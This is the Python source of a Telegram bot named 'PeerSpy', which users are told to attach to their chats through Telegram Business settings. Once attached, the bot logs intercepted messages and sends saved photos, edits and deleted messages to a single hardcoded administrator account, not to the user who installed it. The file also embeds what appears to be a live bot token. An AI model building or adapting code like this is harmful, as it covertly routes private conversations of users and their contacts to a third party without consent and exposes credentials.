import os
import asyncio
import aiohttp
import logging
import sqlite3
from flask import Flask
from threading import Thread
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext

# --- НАСТРОЙКИ ---
TOKEN = "8758417597:AAERQH3jUuduK8syNtCKW8tvHdZXTilJrF8"
ADMIN_ID = 6451702799 

# --- БАЗА ДАННЫХ ---
def init_db():
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS messages (msg_id TEXT PRIMARY KEY, user_id TEXT, text TEXT)''')
    cur.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, join_date TEXT)''')
    conn.commit()
    conn.close()

def add_user(user_id, username):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?)", (user_id, username, str(datetime.now())))
    conn.commit()
    conn.close()

# --- ВЕБ-СЕРВЕР ---
app = Flask('')
@app.route('/')
def home(): return "PeerSpy Active"

def run_web():
    app.run(host='0.0.0.0', port=os.environ.get("PORT", 8080))

# --- БОТ ---
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

class AdminStates(StatesGroup):
    waiting_for_broadcast = State()

def main_menu(user_id):
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="📖 Как подключить?", callback_data="help"))
    builder.row(types.InlineKeyboardButton(text="📈 Мой профиль", callback_data="profile"))
    if user_id == ADMIN_ID:
        builder.row(types.InlineKeyboardButton(text="⚙️ Админ-панель", callback_data="admin_panel"))
    return builder.as_markup()

@dp.message(Command("start"))
async def start(message: types.Message):
    add_user(message.from_user.id, message.from_user.username)
    await message.answer(f"🚀 <b>PeerSpy v3.3</b>\nБизнес-мониторинг активен.", reply_markup=main_menu(message.from_user.id))

# --- ОБРАБОТЧИКИ БИЗНЕС-СОБЫТИЙ ---

# Перехват сообщений (текст и фото)
@dp.business_message()
async def business_msg_handler(message: types.Message):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    txt = message.text or message.caption or "[Медиа]"
    cur.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?)", (str(message.message_id), str(message.from_user.id), txt))
    conn.commit()
    conn.close()

    if message.reply_to_message and message.reply_to_message.photo:
        f_id = message.reply_to_message.photo[-1].file_id
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={f_id}") as r:
                data = await r.json()
                if data.get("ok"):
                    path = data["result"]["file_path"]
                    async with session.get(f"https://api.telegram.org/file/bot{TOKEN}/{path}") as fr:
                        content = await fr.read()
                        await bot.send_photo(ADMIN_ID, types.BufferedInputFile(content, filename="safe.jpg"), caption="🛡 <b>Файл спасен!</b>")

# Перехват изменений
@dp.business_edited_message()
async def business_edit_handler(message: types.Message):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(message.message_id),))
    old = cur.fetchone()
    if old:
        await bot.send_message(ADMIN_ID, f"✏️ <b>Изменено:</b>\nБыло: {old[0]}\nСтало: {message.text}")
    conn.close()

# Перехват удалений (УНИВЕРСАЛЬНЫЙ РЕГИСТРАТОР)
@dp.edited_business_message() # В некоторых версиях это работает для удалений или правок
async def alt_handler(message: types.Message):
    pass # Заглушка для стабильности

# Регистрация удаления через обработчик событий (Event Handler)
@dp.business_deleted_messages()
async def deleted_handler(event: types.BusinessMessagesDeleted):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    for m_id in event.message_ids:
        cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(m_id),))
        res = cur.fetchone()
        if res:
            await bot.send_message(ADMIN_ID, f"🗑 <b>Удалено:</b>\n{res[0]}")
    conn.close()

# --- КНОПКИ И АДМИНКА ---
@dp.callback_query(F.data == "admin_panel")
async def adm_p(c: types.CallbackQuery):
    if c.from_user.id != ADMIN_ID: return
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor(); cur.execute("SELECT COUNT(*) FROM users"); count = cur.fetchone()[0]; conn.close()
    b = InlineKeyboardBuilder(); b.row(types.InlineKeyboardButton(text="📢 Рассылка", callback_data="broadcast"))
    await c.message.answer(f"⚙️ Юзеров: {count}", reply_markup=b.as_markup()); await c.answer()

@dp.callback_query(F.data == "broadcast")
async def b_start(c: types.CallbackQuery, state: FSMContext):
    await c.message.answer("Пиши текст:"); await state.set_state(AdminStates.waiting_for_broadcast); await c.answer()

@dp.message(AdminStates.waiting_for_broadcast)
async def b_do(m: types.Message, state: FSMContext):
    conn = sqlite3.connect('bot_data.db'); cur = conn.cursor(); cur.execute("SELECT user_id FROM users"); users = cur.fetchall(); conn.close()
    for u in users:
        try: await bot.send_message(u[0], m.text)
        except: pass
    await m.answer("Готово!"); await state.clear()

@dp.callback_query(F.data == "help")
async def h_cb(c: types.CallbackQuery):
    await c.message.answer("Инструкция: Настройки -> Business -> Чат-боты."); await c.answer()

async def main():
    init_db()
    Thread(target=run_web).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
